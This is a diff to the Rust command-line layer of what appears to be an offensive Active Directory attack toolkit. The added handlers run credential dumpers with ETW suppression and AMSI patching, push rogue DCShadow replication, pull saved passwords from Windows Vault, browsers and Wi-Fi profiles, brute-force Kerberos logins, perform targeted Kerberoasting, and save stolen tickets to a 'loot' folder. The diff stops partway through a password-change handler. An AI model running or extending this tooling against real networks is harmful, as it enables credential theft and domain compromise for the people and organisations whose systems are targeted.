@@ -3,19 +3,31 @@
 use crate::auth::Credentials;
 use crate::banner;
 use crate::{
-    AdcsAction, AzureAction, BloodHoundAction, C2Action, Cli, CrackMode, DumpLsassMethod,
-    DumpSource, ForgeAction, MoveAction, OutputFormat, PluginAction, ReportFormat, ScanType,
-    SccmAction, SccmTechnique, SecretsAction, ShadowCredAction, ShellType,
+    AdcsAction, AzureAction, BloodHoundAction, C2Action, Cli, CrackMode, DcomExecMethod,
+    DmsaAction, DumpLsassMethod, DumpSource, ForgeAction, LocalCredDumperArg, MoveAction,
+    OutputFormat, PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique, SecretsAction,
+    ShadowCredAction, ShellType,
 };
 use colored::Colorize;
 use kerberos_asn1::Asn1Object;
+use overthrone_core::adcs::certifried::{
+    CertifriedConfig, exploit_certifried as exploit_certifried_core,
+};
 use overthrone_core::c2::{C2Auth, C2Config, C2Framework, C2Manager};
 use overthrone_core::crypto::gpp::{decrypt_gpp_password, parse_gpp_xml};
+use overthrone_core::exec::dcomexec::{
+    DcomExecConfig as CoreDcomExecConfig, DcomExecMethod as CoreDcomExecMethod, dcom_exec,
+};
 use overthrone_core::graph::AttackGraph;
 use overthrone_core::graph::queries::GraphAnalysisEngine;
 use overthrone_core::plugin::{PluginContext, PluginRegistry};
+use overthrone_core::proto::kerberos_brute::{KerberosBruteConfig, brute_kerberos_from_wordlist};
+use overthrone_core::proto::kpasswd::{
+    KpasswdConfig, kpasswd_change_password, kpasswd_reset_password,
+};
 use overthrone_core::proto::rid::{RidAccountType, RidCycleConfig, rid_cycle};
 use overthrone_core::proto::secretsdump::{dump_dcc2, dump_lsa, dump_sam};
+use overthrone_core::proto::targeted_kerberoast::{TargetedKerberoastConfig, targeted_kerberoast};
 #[cfg(feature = "crawler")]
 use overthrone_crawler::CrawlerConfig;
 #[cfg(feature = "forge")]
@@ -25,8 +37,9 @@ use overthrone_reaper::laps::enumerate_laps;
 #[cfg(feature = "reaper")]
 use overthrone_reaper::runner::ReaperConfig;
 use std::collections::HashMap;
+use std::path::PathBuf;
 use std::sync::{Arc, Mutex};
-use tracing::{debug, warn};
+use tracing::{debug, info, warn};
 
 // ----------------------------------------------
 // Output helpers
@@ -34,7 +47,7 @@ use tracing::{debug, warn};
 
 /// Emit result as JSON to stdout (and optionally to a file), then return 0.
 /// Callers should return the result of this function directly.
-fn emit_json(cli: &Cli, value: serde_json::Value) -> i32 {
+pub fn emit_json(cli: &Cli, value: serde_json::Value) -> i32 {
     let json_str = serde_json::to_string_pretty(&value)
         .unwrap_or_else(|e| format!("{{\"error\": \"serialization failure: {}\"}}", e));
     println!("{}", json_str);
@@ -48,8 +61,463 @@ fn emit_json(cli: &Cli, value: serde_json::Value) -> i32 {
 
 /// Return true when the caller requested JSON output.
 #[inline]
-fn wants_json(cli: &Cli) -> bool {
+pub fn wants_json(cli: &Cli) -> bool {
     matches!(cli.stdout_format, OutputFormat::Json)
+}
+
+// ----------------------------------------------
+// cmd_sherlock -- Windows vulnerability enumeration
+// ----------------------------------------------
+
+pub async fn cmd_sherlock(
+    cli: &Cli,
+    os_version: Option<&str>,
+    build_number: Option<u32>,
+    installed_kbs: &[String],
+    cves: &[String],
+    format: overthrone_core::postex::SherlockOutputFormat,
+) -> i32 {
+    banner::print_module_banner("SHERLOCK");
+
+    let config = overthrone_core::postex::SherlockConfig {
+        os_version: os_version.map(|s| s.to_string()),
+        build_number,
+        installed_kbs: installed_kbs.to_vec(),
+        cves_to_check: cves.to_vec(),
+        output_format: format,
+    };
+
+    let result = match overthrone_core::postex::run_sherlock(&config).await {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("Sherlock failed: {e}"));
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "error",
+                        "error": e.to_string(),
+                    }),
+                );
+            }
+            return 1;
+        }
+    };
+
+    let score = overthrone_core::postex::result_risk_score(&result);
+
+    if wants_json(cli) {
+        return emit_json(
+            cli,
+            serde_json::json!({
+                "status": "success",
+                "os_version": result.os_version,
+                "build_number": result.build_number,
+                "installed_kbs": result.installed_kbs,
+                "vulnerable_count": result.vulnerable_count,
+                "risk_score": score,
+                "findings": result.findings,
+                "recommendations": result.exploit_recommendations,
+            }),
+        );
+    }
+
+    println!(
+        " {} OS: {} (build {})",
+        ">".bright_black(),
+        result.os_version.cyan(),
+        result
+            .build_number
+            .map(|b| b.to_string())
+            .unwrap_or_else(|| "unknown".into())
+            .cyan()
+    );
+    println!(
+        " {} Installed KBs: {}",
+        ">".bright_black(),
+        result.installed_kbs.len().to_string().green()
+    );
+    println!(
+        " {} Vulnerable findings: {} (risk score: {})",
+        ">".bright_black(),
+        result.vulnerable_count.to_string().red(),
+        score.to_string().yellow()
+    );
+
+    for finding in &result.findings {
+        if finding.is_vulnerable {
+            println!(
+                " {} [{}] {} - {}",
+                "[!]".red(),
+                finding.severity.yellow(),
+                finding.cve_id.cyan(),
+                finding.title.bright_black()
+            );
+            if !finding.missing_kbs.is_empty() {
+                println!("     Missing KBs: {}", finding.missing_kbs.join(", ").red());
+            }
+            println!(
+                "     Exploit: {}",
+                finding.exploit_recommendation.bright_black()
+            );
+        }
+    }
+
+    if result.vulnerable_count == 0 {
+        banner::print_success("No vulnerable CVEs detected for this system");
+    } else {
+        banner::print_fail(&format!(
+            "{} vulnerable CVE(s) found (risk score: {})",
+            result.vulnerable_count, score
+        ));
+    }
+
+    0
+}
+
+// ----------------------------------------------
+// cmd_local_creds -- Modular local credential dumpers
+// ----------------------------------------------
+
+#[allow(clippy::too_many_arguments)]
+pub async fn cmd_local_creds(
+    cli: &Cli,
+    dumper_arg: LocalCredDumperArg,
+    output: Option<&str>,
+    all: bool,
+    pid: Option<u32>,
+    suppress_etw: bool,
+    patch_amsi: bool,
+    max_size_mb: usize,
+) -> i32 {
+    banner::print_module_banner("LOCAL CREDS");
+
+    let dumper: overthrone_core::postex::LocalCredDumper = dumper_arg.into();
+
+    if all {
+        let configs: Vec<overthrone_core::postex::LocalCredDumperConfig> =
+            overthrone_core::postex::LocalCredDumper::all()
+                .iter()
+                .map(|d| overthrone_core::postex::LocalCredDumperConfig {
+                    dumper: *d,
+                    output_path: output
+                        .map(|s| format!("{}_{}.dmp", s, d.name().replace(' ', "_"))),
+                    custom_pid: pid,
+                    suppress_etw,
+                    patch_amsi,
+                    max_dump_size_mb: max_size_mb,
+                    ..Default::default()
+                })
+                .collect();
+
+        let results = overthrone_core::postex::dump_local_credentials_all(&configs).await;
+
+        if wants_json(cli) {
+            return emit_json(
+                cli,
+                serde_json::json!({
+                    "status": if results.iter().any(|r| r.success) { "success" } else { "partial" },
+                    "results": results,
+                }),
+            );
+        }
+
+        let mut total_creds = 0usize;
+        let mut any_success = false;
+        for result in &results {
+            let status = if result.success {
+                "[+]".green()
+            } else {
+                "[-]".red()
+            };
+            println!(
+                " {} {}: {} credential(s)",
+                status,
+                result.dumper.name().cyan(),
+                result.credentials.len().to_string().yellow()
+            );
+            total_creds += result.credentials.len();
+            any_success |= result.success;
+            for err in &result.errors {
+                println!("     {} {}", "[-]".red(), err.red());
+            }
+        }
+
+        if any_success {
+            banner::print_success(&format!("Aggregated {total_creds} credential(s)"));
+        } else {
+            banner::print_fail(
+                "All local dumpers failed (Windows-only or insufficient privileges)",
+            );
+            return 1;
+        }
+        return 0;
+    }
+
+    let config = overthrone_core::postex::LocalCredDumperConfig {
+        dumper,
+        output_path: output.map(|s| s.to_string()),
+        custom_pid: pid,
+        suppress_etw,
+        patch_amsi,
+        max_dump_size_mb: max_size_mb,
+        ..Default::default()
+    };
+
+    let result = match unsafe { overthrone_core::postex::dump_local_credentials(&config) } {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("Dumper error: {e}"));
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "error",
+                        "dumper": dumper.name(),
+                        "error": e.to_string(),
+                    }),
+                );
+            }
+            return 1;
+        }
+    };
+
+    if wants_json(cli) {
+        return emit_json(
+            cli,
+            serde_json::json!({
+                "status": if result.success { "success" } else { "partial" },
+                "dumper": result.dumper.name(),
+                "method": result.method.name(),
+                "credentials": result.credentials,
+                "errors": result.errors,
+                "warnings": result.warnings,
+            }),
+        );
+    }
+
+    println!(" {} Dumper: {}", ">".bright_black(), dumper.name().cyan());
+    println!(
+        " {} Credentials: {}",
+        ">".bright_black(),
+        result.credentials.len().to_string().yellow()
+    );
+
+    for cred in &result.credentials {
+        let mut parts = vec![];
+        if let Some(ref h) = cred.ntlm {
+            parts.push(format!("ntlm:{h}"));
+        }
+        if let Some(ref k) = cred.aes256 {
+            parts.push(format!("aes256:{k}"));
+        }
+        if let Some(ref p) = cred.plaintext {
+            parts.push(format!("plaintext:{p}"));
+        }
+        println!(
+            " {} {} {}",
+            "+".bright_green(),
+            cred.identity.cyan(),
+            parts.join(" ").bright_black()
+        );
+    }
+
+    for err in &result.errors {
+        println!(" {} {}", "[-]".red(), err.red());
+    }
+
+    if result.success {
+        banner::print_success(&format!(
+            "Dumper returned {} credential(s)",
+            result.credentials.len()
+        ));
+    } else {
+        banner::print_fail(&format!(
+            "{} failed: {}",
+            dumper.name(),
+            result.errors.join("; ")
+        ));
+        return 1;
+    }
+
+    0
+}
+
+// ----------------------------------------------
+// cmd_dcshadow -- Rogue DC push via MS-DRSR
+// ----------------------------------------------
+
+#[allow(clippy::too_many_arguments)]
+pub async fn cmd_dcshadow(
+    cli: &Cli,
+    target_dc: &str,
+    domain: &str,
+    computer_name: &str,
+    computer_password: Option<&str>,
+    site_name: &str,
+    listener_ip: &str,
+    listener_port: u16,
+    dry_run: bool,
+    no_cleanup: bool,
+    objects_json: Option<&str>,
+) -> i32 {
+    banner::print_module_banner("DCSHADOW");
+
+    println!(" {} Target DC: {}", ">".bright_black(), target_dc.cyan());
+    println!(" {} Domain: {}", ">".bright_black(), domain.cyan());
+    println!(
+        " {} Rogue computer: {}$",
+        ">".bright_black(),
+        computer_name.cyan()
+    );
+    println!(" {} Site: {}", ">".bright_black(), site_name.cyan());
+    println!(
+        " {} Listener: {}:{}",
+        ">".bright_black(),
+        listener_ip.cyan(),
+        listener_port.to_string().cyan()
+    );
+
+    let objects_to_push: Vec<overthrone_core::postex::ShadowObject> = match objects_json {
+        Some(json) => match serde_json::from_str(json) {
+            Ok(objs) => objs,
+            Err(e) => {
+                banner::print_fail(&format!("Invalid --objects JSON: {e}"));
+                if wants_json(cli) {
+                    return emit_json(
+                        cli,
+                        serde_json::json!({
+                            "status": "error",
+                            "error": format!("invalid objects JSON: {e}"),
+                        }),
+                    );
+                }
+                return 1;
+            }
+        },
+        None => Vec::new(),
+    };
+
+    let config = overthrone_core::postex::DcShadowConfig {
+        target_dc: target_dc.to_string(),
+        domain: domain.to_string(),
+        site_name: site_name.to_string(),
+        computer_name: computer_name.to_string(),
+        computer_password: computer_password.unwrap_or("").to_string(),
+        listener_ip: listener_ip.to_string(),
+        listener_port,
+        objects_to_push,
+        cleanup: !no_cleanup,
+        kerberos: false,
+    };
+
+    if dry_run {
+        let preflight = overthrone_core::postex::preflight_dcshadow(&config).await;
+        if wants_json(cli) {
+            return emit_json(
+                cli,
+                serde_json::json!({
+                    "status": "dry-run",
+                    "config": {
+                        "target_dc": config.target_dc,
+                        "domain": config.domain,
+                        "computer_name": config.computer_name,
+                        "listener": format!("{}:{}", config.listener_ip, config.listener_port),
+                        "objects_count": config.objects_to_push.len(),
+                    },
+                    "preflight": {
+                        "reachable": preflight.target_dc_reachable,
+                        "ldap_port_open": preflight.ldap_port_open,
+                        "rpc_port_open": preflight.rpc_port_open,
+                        "warnings": preflight.warnings,
+                    },
+                }),
+            );
+        }
+        println!(
+            " {} Reachable: {} | LDAP: {} | RPC: {}",
+            ">".bright_black(),
+            preflight.target_dc_reachable.to_string().cyan(),
+            preflight.ldap_port_open.to_string().cyan(),
+            preflight.rpc_port_open.to_string().cyan()
+        );
+        if !preflight.warnings.is_empty() {
+            for w in &preflight.warnings {
+                println!(" {} {}", "[!]".yellow(), w.yellow());
+            }
+        }
+        banner::print_success("Dry-run configuration is valid");
+        return 0;
+    }
+
+    let result = match overthrone_core::postex::run_dcshadow(&config).await {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("DCShadow error: {e}"));
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "error",
+                        "error": e.to_string(),
+                    }),
+                );
+            }
+            return 1;
+        }
+    };
+
+    if wants_json(cli) {
+        return emit_json(
+            cli,
+            serde_json::json!({
+                "status": if result.success { "success" } else { "partial" },
+                "success": result.success,
+                "rogue_server_dn": result.rogue_server_dn,
+                "rogue_ntdsdsa_dn": result.rogue_ntdsdsa_dn,
+                "pushed_objects": result.pushed_objects,
+                "message": result.message,
+            }),
+        );
+    }
+
+    println!(
+        " {} Success: {}",
+        ">".bright_black(),
+        if result.success {
+            "yes".green()
+        } else {
+            "no".red()
+        }
+    );
+    println!(
+        " {} Server DN: {}",
+        ">".bright_black(),
+        result.rogue_server_dn.cyan()
+    );
+    println!(
+        " {} nTDSDSA DN: {}",
+        ">".bright_black(),
+        result.rogue_ntdsdsa_dn.cyan()
+    );
+    println!(
+        " {} Pushed objects: {}",
+        ">".bright_black(),
+        result.pushed_objects.len().to_string().yellow()
+    );
+    println!(
+        " {} Message: {}",
+        ">".bright_black(),
+        result.message.bright_black()
+    );
+
+    if result.success {
+        banner::print_success("DCShadow chain completed");
+        0
+    } else {
+        banner::print_fail(&format!("DCShadow did not complete: {}", result.message));
+        1
+    }
 }
 
 // ----------------------------------------------
@@ -320,6 +788,331 @@ pub async fn cmd_dump_lsass(
 
     if wants_json(_cli) {
         emit_json(_cli, serde_json::to_value(&result).unwrap_or_default());
+    }
+
+    0
+}
+
+// ----------------------------------------------
+// cmd_vault -- Windows Vault / Credential Manager
+// ----------------------------------------------
+
+/// Extract credentials from Windows Vault (mimikatz vault::list + vault::cred).
+pub async fn cmd_vault(cli: &Cli, backup_key_file: Option<&str>, all: bool) -> i32 {
+    banner::print_module_banner("VAULT");
+
+    // Load backup key if provided
+    let backup_key = if let Some(path) = backup_key_file {
+        match std::fs::read(path) {
+            Ok(data) => {
+                println!(
+                    " {} Backup key loaded ({} bytes)",
+                    ">".bright_black(),
+                    data.len().to_string().cyan()
+                );
+                data
+            }
+            Err(e) => {
+                banner::print_fail(&format!("Failed to read backup key file '{}': {}", path, e));
+                return 1;
+            }
+        }
+    } else {
+        Vec::new()
+    };
+
+    let config = overthrone_core::postex::VaultExtractConfig {
+        backup_key,
+        vault_dir: None,
+        user_profile_base: None,
+        skip_on_error: true,
+        scan_all_users: true,
+    };
+
+    let result = overthrone_core::postex::extract_vault_credentials(&config);
+
+    if result.vaults.is_empty() {
+        println!(" {} No vaults found.", "!".bright_yellow());
+        if result.errors.is_empty() {
+            println!("   Windows Vault may not exist on this system.");
+        } else {
+            for err in &result.errors {
+                println!("   Error: {}", err.red());
+            }
+        }
+        return 0;
+    }
+
+    for vault in &result.vaults {
+        println!(
+            "\n {} Vault: {} ({})",
+            "*".bright_blue(),
+            vault.name.bright_cyan(),
+            vault.guid.bright_black()
+        );
+        println!(
+            " {} Path: {:?}",
+            ">".bright_black(),
+            vault.path.to_string_lossy().cyan()
+        );
+        println!(
+            " {} Items ({})",
+            ">".bright_black(),
+            format!("{}", vault.entry_count).yellow()
+        );
+
+        if all || vault.entry_count > 0 {
+            for entry in &vault.entries {
+                println!(
+                    "   {} {} {} -> {} [{}]",
+                    "+".bright_green(),
+                    entry.resource.cyan(),
+                    "=>".bright_black(),
+                    entry.identity.yellow(),
+                    entry.cred_type_name.bright_black()
+                );
+                if !entry.password.is_empty() && entry.password != "[ENCRYPTED]" {
+                    println!(
+                        "     {} Authenticator: {}",
+                        " ".bright_black(),
+                        entry.password.green()
+                    );
+                }
+                println!(
+                    "     {} Last written: {}, Flags: {:#x}",
+                    " ".bright_black(),
+                    entry.last_written.bright_black(),
+                    entry.flags
+                );
+            }
+        } else {
+            println!("   (use --all to show decrypted entries)");
+        }
+    }
+
+    println!(
+        "\n {} Summary: {} vaults, {} entries ({} domain, {} generic)",
+        "=".bright_blue(),
+        result.vaults.len().to_string().cyan(),
+        result.total_entries.to_string().yellow(),
+        result.domain_password_count.to_string().green(),
+        result.generic_count.to_string().green(),
+    );
+
+    if wants_json(cli) {
+        emit_json(cli, serde_json::to_value(&result).unwrap_or_default());
+    }
+
+    0
+}
+
+// ----------------------------------------------
+// cmd_browser -- Browser Credential Extraction
+// ----------------------------------------------
+
+/// Extract saved passwords from Chrome, Edge, Brave, Firefox, Opera.
+pub async fn cmd_browser(
+    cli: &Cli,
+    browsers: &[String],
+    backup_key_file: Option<&str>,
+    profile_dir: Option<&str>,
+    _all: bool,
+) -> i32 {
+    banner::print_module_banner("BROWSER CREDS");
+
+    // Parse browser types
+    let target_browsers: Vec<overthrone_core::postex::BrowserType> = if browsers.is_empty() {
+        vec![
+            overthrone_core::postex::BrowserType::Chrome,
+            overthrone_core::postex::BrowserType::Edge,
+            overthrone_core::postex::BrowserType::Brave,
+            overthrone_core::postex::BrowserType::Firefox,
+            overthrone_core::postex::BrowserType::Opera,
+        ]
+    } else {
+        browsers
+            .iter()
+            .filter_map(|b| match b.to_lowercase().as_str() {
+                "chrome" => Some(overthrone_core::postex::BrowserType::Chrome),
+                "edge" => Some(overthrone_core::postex::BrowserType::Edge),
+                "brave" => Some(overthrone_core::postex::BrowserType::Brave),
+                "firefox" => Some(overthrone_core::postex::BrowserType::Firefox),
+                "opera" => Some(overthrone_core::postex::BrowserType::Opera),
+                "vivaldi" => Some(overthrone_core::postex::BrowserType::Vivaldi),
+                _ => {
+                    println!(" {} Unknown browser: '{}'", "!".bright_yellow(), b.red());
+                    None
+                }
+            })
+            .collect()
+    };
+
+    let backup_key = if let Some(path) = backup_key_file {
+        match std::fs::read(path) {
+            Ok(data) => data,
+            Err(e) => {
+                banner::print_fail(&format!("Failed to read backup key: {}", e));
+                return 1;
+            }
+        }
+    } else {
+        Vec::new()
+    };
+
+    let config = overthrone_core::postex::BrowserExtractConfig {
+        browsers: target_browsers,
+        backup_key,
+        chromium_profile: profile_dir.map(PathBuf::from),
+        ..Default::default()
+    };
+
+    let result = overthrone_core::postex::extract_browser_credentials(&config);
+
+    if result.credentials.is_empty() {
+        println!(" {} No browser credentials found.", "!".bright_yellow());
+        for warn in &result.warnings {
+            println!("   Warning: {}", warn.yellow());
+        }
+        return 0;
+    }
+
+    println!(
+        "\n {} Found {} credentials across {} browsers:",
+        "*".bright_blue(),
+        result.total_count.to_string().green(),
+        result.per_browser.len().to_string().cyan()
+    );
+
+    for (browser, count) in &result.per_browser {
+        if *count > 0 {
+            println!(
+                "   {} {} : {}",
+                "+".bright_green(),
+                browser.cyan(),
+                count.to_string().yellow()
+            );
+        }
+    }
+
+    if _all {
+        for cred in &result.credentials {
+            println!(
+                "\n   {} [{}] {}",
+                "+".bright_green(),
+                cred.browser.bright_black(),
+                cred.origin.cyan()
+            );
+            println!(
+                "     {} Username: {}",
+                " ".bright_black(),
+                cred.username.yellow()
+            );
+            println!(
+                "     {} Password: {}",
+                " ".bright_black(),
+                cred.password.green()
+            );
+        }
+    }
+
+    if wants_json(cli) {
+        emit_json(cli, serde_json::to_value(&result).unwrap_or_default());
+    }
+
+    0
+}
+
+// ----------------------------------------------
+// cmd_wifi -- Wi-Fi Profile Credential Extraction
+// ----------------------------------------------
+
+/// Extract saved Wi-Fi passwords from WLAN profiles.
+pub async fn cmd_wifi(
+    cli: &Cli,
+    backup_key_file: Option<&str>,
+    profiles_dir: Option<&str>,
+    _all: bool,
+) -> i32 {
+    banner::print_module_banner("WIFI CREDS");
+
+    let backup_key = if let Some(path) = backup_key_file {
+        match std::fs::read(path) {
+            Ok(data) => data,
+            Err(e) => {
+                banner::print_fail(&format!("Failed to read backup key: {}", e));
+                return 1;
+            }
+        }
+    } else {
+        Vec::new()
+    };
+
+    let config = overthrone_core::postex::WifiExtractConfig {
+        backup_key,
+        custom_profile_dir: profiles_dir.map(PathBuf::from),
+        ..Default::default()
+    };
+
+    let result = overthrone_core::postex::extract_wifi_credentials(&config);
+
+    if result.profiles.is_empty() {
+        println!(" {} No Wi-Fi profiles found.", "!".bright_yellow());
+        if !result.errors.is_empty() {
+            for err in &result.errors {
+                println!("   Error: {}", err.red());
+            }
+        }
+        return 0;
+    }
+
+    println!(
+        "\n {} Found {} Wi-Fi profiles ({} decrypted):",
+        "*".bright_blue(),
+        result.total_count.to_string().yellow(),
+        result.decrypted_count.to_string().green()
+    );
+
+    if _all {
+        for profile in &result.profiles {
+            let key_display = if profile.key_material.starts_with('[') {
+                profile.key_material.bright_black()
+            } else {
+                profile.key_material.green()
+            };
+
+            println!(
+                "\n   {} {} ({} / {})",
+                "+".bright_green(),
+                profile.ssid.cyan(),
+                profile.auth_type.bright_black(),
+                profile.encryption.bright_black()
+            );
+            println!("     {} Key: {}", " ".bright_black(), key_display);
+            println!(
+                "     {} Mode: {}",
+                " ".bright_black(),
+                profile.connection_mode.bright_black()
+            );
+        }
+    } else {
+        for profile in &result.profiles {
+            let key_status = if profile.key_material.starts_with('[') {
+                "[encrypted]".red()
+            } else {
+                "[decrypted]".green()
+            };
+            println!(
+                "   {} {} ({})",
+                "+".bright_green(),
+                profile.ssid.cyan(),
+                key_status
+            );
+        }
+        println!("\n   Use --all to show decrypted keys");
+    }
+
+    if wants_json(cli) {
+        emit_json(cli, serde_json::to_value(&result).unwrap_or_default());
     }
 
     0
@@ -6374,6 +7167,1312 @@ pub async fn get_cached_tgt(
     }
 
     Ok(tgt)
+}
+
+// ----------------------------------------------
+// cmd_asktgt / cmd_asktgs -- Rubeus-style wrappers
+// ----------------------------------------------
+
+pub async fn cmd_asktgt(cli: &Cli, dc: &str) -> i32 {
+    use overthrone_core::cred_cache::CredCache;
+    use overthrone_core::proto::kerberos;
+
+    banner::print_module_banner("ASKTGT");
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let (secret, use_hash) = match creds.secret_and_hash_flag() {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&e);
+            return 1;
+        }
+    };
+
+    match get_cached_tgt(dc, &creds.domain, &creds.username, &secret, use_hash, false).await {
+        Ok(tgt) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "user": tgt.client_principal,
+                        "realm": tgt.client_realm,
+                    }),
+                );
+            }
+
+            println!(
+                "{} TGT {} for {}@{}",
+                "[+]".green(),
+                "obtained".cyan(),
+                tgt.client_principal.cyan(),
+                tgt.client_realm.cyan()
+            );
+
+            let loot_dir = std::path::PathBuf::from("./loot");
+            let _ = std::fs::create_dir_all(&loot_dir);
+            let kirbi_path = loot_dir.join("asktgt.kirbi");
+            let kirbi_bytes = kerberos::tgd_to_kirbi(&tgt);
+            if std::fs::write(&kirbi_path, &kirbi_bytes).is_ok() {
+                println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
+            }
+
+            let cache = CredCache::new();
+            let _ = cache.save_tgt(&tgt);
+            banner::print_success("TGT obtained");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("TGT request failed: {e}"));
+            1
+        }
+    }
+}
+
+pub async fn cmd_asktgs(cli: &Cli, dc: &str, spn: &str) -> i32 {
+    use overthrone_core::proto::kerberos;
+
+    banner::print_module_banner("ASKTGS");
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let (secret, use_hash) = match creds.secret_and_hash_flag() {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&e);
+            return 1;
+        }
+    };
+
+    let tgt =
+        match get_cached_tgt(dc, &creds.domain, &creds.username, &secret, use_hash, false).await {
+            Ok(t) => t,
+            Err(e) => {
+                banner::print_fail(&format!("TGT request failed: {e}"));
+                return 1;
+            }
+        };
+
+    match kerberos::request_service_ticket(dc, &tgt, spn).await {
+        Ok(st) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "spn": spn,
+                    }),
+                );
+            }
+
+            println!(
+                "{} Service ticket for {} obtained",
+                "[+]".green(),
+                spn.cyan()
+            );
+            let loot_dir = std::path::PathBuf::from("./loot");
+            let _ = std::fs::create_dir_all(&loot_dir);
+            let safe_spn = spn.replace(['/', ':'], "_");
+            let kirbi_path = loot_dir.join(format!("asktgs_{safe_spn}.kirbi"));
+            if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
+                use kerberos_asn1::Asn1Object;
+                use std::io::Write;
+                let _ = f.write_all(&st.ticket.build());
+                println!("{} Saved to {}", "->".cyan(), kirbi_path.display());
+            }
+            banner::print_success("TGS obtained");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("TGS request failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_kerberos_brute -- AS-REQ brute-force
+// ----------------------------------------------
+
+pub async fn cmd_kerberos_brute(
+    cli: &Cli,
+    dc: &str,
+    wordlist: &str,
+    stop_on_success: bool,
+    asrep_only: bool,
+    delay: u64,
+    jitter: u64,
+) -> i32 {
+    banner::print_module_banner("KERBEROS BRUTE");
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let passwords = match std::fs::read_to_string(wordlist) {
+        Ok(s) => s.lines().map(|l| l.to_string()).collect::<Vec<_>>(),
+        Err(e) => {
+            banner::print_fail(&format!("Failed to read wordlist: {e}"));
+            return 1;
+        }
+    };
+
+    if passwords.is_empty() {
+        banner::print_fail("Wordlist is empty");
+        return 1;
+    }
+
+    println!(
+        " {} Brute-forcing {} with {} password(s)",
+        ">".bright_black(),
+        creds.username.cyan(),
+        passwords.len()
+    );
+
+    let config = KerberosBruteConfig {
+        dc_ip: dc.to_string(),
+        domain: creds.domain.clone(),
+        username: creds.username.clone(),
+        password_list: passwords,
+        delay_ms: delay,
+        jitter_ms: jitter,
+        stop_on_success,
+        output_file: None,
+        asrep_only,
+    };
+
+    match brute_kerberos_from_wordlist(&config, wordlist).await {
+        Ok(result) => {
+            if wants_json(cli) {
+                let valid_json: Vec<serde_json::Value> = result
+                    .valid_credentials
+                    .iter()
+                    .map(|v| {
+                        serde_json::json!({
+                            "username": v.username,
+                            "password": v.password,
+                            "is_asrep": v.is_asrep,
+                        })
+                    })
+                    .collect();
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "attempted": result.attempted,
+                        "elapsed_seconds": result.elapsed_seconds,
+                        "valid": valid_json,
+                        "asrep_roastable": result.asrep_roastable,
+                    }),
+                );
+            }
+
+            println!(
+                "{} Attempted {} password(s) in {:.2}s",
+                "[+]".green(),
+                result.attempted,
+                result.elapsed_seconds
+            );
+
+            for v in &result.valid_credentials {
+                println!(
+                    "{} Valid: {} / {}",
+                    "[+]".green(),
+                    v.username.cyan(),
+                    v.password.yellow()
+                );
+            }
+            if result.valid_credentials.is_empty() {
+                println!(" {} No valid credentials found", "!".yellow());
+            }
+            if !result.asrep_roastable.is_empty() {
+                println!(
+                    "{} AS-REP roastable user(s): {}",
+                    "[+]".green(),
+                    result.asrep_roastable.join(", ").cyan()
+                );
+            }
+
+            if result.valid_credentials.is_empty() {
+                1
+            } else {
+                banner::print_success("Brute-force completed");
+                0
+            }
+        }
+        Err(e) => {
+            banner::print_fail(&format!("Brute-force failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_targeted_kerberoast
+// ----------------------------------------------
+
+pub async fn cmd_targeted_kerberoast(
+    cli: &Cli,
+    dc: &str,
+    target_user: &str,
+    fake_spn: Option<&str>,
+    cleanup: bool,
+    downgrade_rc4: bool,
+) -> i32 {
+    banner::print_module_banner("TARGETED KERBEROAST");
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--domain is required for targetedKerberoast");
+            return 1;
+        }
+    };
+
+    let mut ldap = match connect_ldap_session(dc, &domain, &creds).await {
+        Ok(l) => l,
+        Err(e) => return e,
+    };
+
+    let config = TargetedKerberoastConfig {
+        dc_ip: dc.to_string(),
+        domain,
+        target_user: target_user.to_string(),
+        fake_spn: fake_spn.map(|s| s.to_string()),
+        cleanup,
+        downgrade_rc4,
+    };
+
+    println!(
+        " {} Targeting {} (cleanup={})",
+        ">".bright_black(),
+        target_user.cyan(),
+        cleanup
+    );
+
+    match targeted_kerberoast(&mut ldap, &config).await {
+        Ok(result) => {
+            if wants_json(cli) {
+                return emit_json(
+                    cli,
+                    serde_json::json!({
+                        "status": "success",
+                        "target_user": result.target_user,
+                        "spn": result.spn,
+                        "cleaned_up": result.cleaned_up,
+                        "hashcat_format": result.hashcat_format,
+                    }),
+                );
+            }
+
+            println!(
+                "{} Roasted SPN {} for user {}",
+                "[+]".green(),
+                result.spn.cyan(),
+                result.target_user.cyan()
+            );
+            println!(
+                "{} Hashcat: {}",
+                "->".cyan(),
+                result.hashcat_format.yellow()
+            );
+            if result.cleaned_up {
+                println!("{} Fake SPN removed", "[+]".green());
+            }
+            banner::print_success("targetedKerberoast completed");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("targetedKerberoast failed: {e}"));
+            1
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_kpasswd -- Kerberos password change/reset
+// ----------------------------------------------
+
+pub async fn cmd_kpasswd(
+    cli: &Cli,
+    dc: &str,
+    target_user: Option<&str>,
